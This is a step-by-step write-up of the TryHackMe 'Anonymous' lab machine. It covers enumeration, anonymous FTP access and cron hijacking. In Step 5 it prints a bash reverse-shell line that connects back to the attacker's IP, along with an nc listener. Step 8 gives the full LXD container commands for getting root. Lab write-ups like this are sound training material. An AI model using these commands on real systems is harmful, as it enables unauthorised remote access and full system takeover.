# Anonymous Walkthrough - TryHackMe  

---

## Introduction 

Essentially, the owner of the box left an **FTP directory writable to guests**. Inside, there is a bash script called `clean.sh` that cleans the `/tmp` directory. This script is run by a **cron job**, which means we can **modify files in the FTP share** to include a malicious line of code and gain a shell on the box — part 1 done.  

For privilege escalation, the user we log in as is a member of the **sudo group**. This allows us to leverage **LXD** to get root on the box.  

Let’s jump in!  

---

## Step 1: Nmap Scan

We start with a basic scan:

``
nmap -sC -sV <target-ip>``
Initially, only two ports were open.

    No web server was found, so a full TCP scan was run to check for missed ports.

    Two more ports were discovered: standard SMB ports.

Step 2: Service Analysis

    SearchSploit was used to analyze the FTP service.

    We discovered anonymous FTP login is allowed.

Step 3: FTP Enumeration

Connect to FTP using:

ftp <target-ip>

Explore the files on the FTP share:

    To_do.txt – Reminder to disable anonymous login

    clean.sh – Bash script deleting /tmp files

    removed_files.log – Logs of deleted files

Since the script is run by cron, modifying clean.sh allows us to inject a reverse shell.
Step 4: SMB Enumeration

    SMB share named pics allowed NULL authentication.

    The share contained just images (likely not relevant), so we returned to FTP exploitation.

Step 5: Gaining a Shell

    Edit clean.sh and add a bash reverse shell with your IP:

bash -i >& /dev/tcp/<your-ip>/4444 0>&1

    Upload the modified script using FTP append:

ftp> append clean.sh

    Start a listener on your machine:

nc -lvnp 4444

    Wait for the cron job to execute clean.sh. A few seconds later, a shell is obtained.

Step 6: Capture User Flag

Navigate to the user's home directory:

cd /home/namelessone
cat user.txt

Step 7: Privilege Escalation

    Check /etc/passwd to identify users with shells (root and namelessone).

    Run LinPEAS for automated enumeration. It revealed the user is part of sudo and adm groups.

    If we had a password for namelessone, we could escalate to root via sudo.

    Found potential privilege escalation via LXD.

Step 8: Exploiting LXD

LXD is Ubuntu's container manager using Linux containers. Users in the lxd group can be exploited to gain root.

    Download LXD Alpine builder from GitHub.

    Build a small Alpine Linux image.

    Upload the image to the target machine.

    Import the image into LXC:

lxc image import alpine.tar.gz --alias myalpine

    Create and start a container:

lxc init myalpine privesc -c security.privileged=true
lxc config device add privesc mydisk disk source=/ path=/mnt
lxc start privesc
lxc exec privesc -- /bin/bash

    We now have root access on the box.

Step 9: Capture Root Flag

cat /root/root.txt

Submit the flag and claim your points!
Conclusion

    Exploited writable FTP + cron to get a shell.

    Escalated privileges using LXD containers.

    Learned about the dangers of sudo group membership and LXD.

References

    Privilege Escalation via LXD

Linux Privilege Escalation via LXD & Hijacked UNIX Socket

TryHackMe Room: Anonymous
